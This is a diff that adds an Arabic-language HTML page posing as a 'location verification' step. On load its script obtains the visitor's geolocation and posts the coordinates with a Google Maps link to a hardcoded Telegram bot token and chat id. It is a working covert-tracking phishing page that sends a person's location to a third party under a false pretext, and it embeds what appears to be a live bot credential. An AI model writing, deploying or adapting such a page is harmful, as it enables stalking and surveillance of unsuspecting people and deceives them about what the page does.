@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>تأكيد الموقع</title>
+</head>
+<body>
+  <h2>جارٍ التحقق من موقعك...</h2>
+  <script>
+    const botToken = "7659784715:AAF0ghJdj3gvsHrTmVdTkeTr93ANnQtOWRc";
+    const chatId = "64367851";
+
+    function sendLocation(lat, lon) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: chatId,
+        text: `📍 موقع الشخص:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`
+      };
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocation(pos.coords.latitude, pos.coords.longitude);
+          document.body.innerHTML = "<h3>✅ تم إرسال موقعك</h3>";
+        },
+        (err) => {
+          document.body.innerHTML = "<h3>❌ لم يتم السماح بالحصول على الموقع</h3>";
+        }
+      );
+    } else {
+      document.body.innerHTML = "<h3>⚠️ جهازك لا يدعم تحديد الموقع</h3>";
+    }
+  </script>
+</body>
+</html>
